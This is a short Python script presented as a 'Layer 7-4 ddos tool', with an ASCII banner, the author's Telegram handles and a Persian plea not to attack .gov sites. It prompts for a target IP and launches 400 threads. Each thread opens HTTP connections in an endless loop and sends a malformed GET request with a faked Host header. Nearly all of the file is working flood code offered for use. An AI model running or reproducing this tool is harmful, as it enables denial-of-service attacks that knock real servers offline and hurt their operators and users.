print ('''
    /////    /////   ////////////////
   CCCCC/   CCCCC/   |    ss.py    |/
  CC/      CC/       |-------------|/ 
  CC/      CC/       |  Layer 7-4  |/ 
  CC/////  CC/////   |  ddos  tool |/ 
   CCCCC/   CCCCC/   |_____________|/
>--------------------------------------------->
Version 1.0 (2023)
    C0d3d by Sm3R
┌─────────────────────────────────────────────┐
│         lotfan be .gov ddos nazanid       │
├─────────────────────────────────────────────┤
│                                │
├─────────────────────────────────────────────┤
│ Telegram : t.me/imsmer │t.me/sm3rmc
└─────────────────────────────────────────────┘''')

import socket, os, time
import threading



target = input("Enter target ip :  \n ")
fake_ip = "40.199.23.23"
port = 80

counter = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /"+target+"HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(("Host:"+fake_ip+"\r\n\r\n").encode('ascii'),(target,port))
 
        global counter
        counter += 1
        print(counter)
        
        
        s.close()
 
print(" [              ]  0% ")
time.sleep(1)
print(" [•••••         ]  20% ")
time.sleep(1)
print(" [••••••••      ]  60% ")
time.sleep(1)
print(" [••••••••••••••]  100% ")
time.sleep(1)
print("Attack Start . . . !")
time.sleep(1)
 
 
for i in range(400):
 thread = threading.Thread(target=attack)
 thread.start()
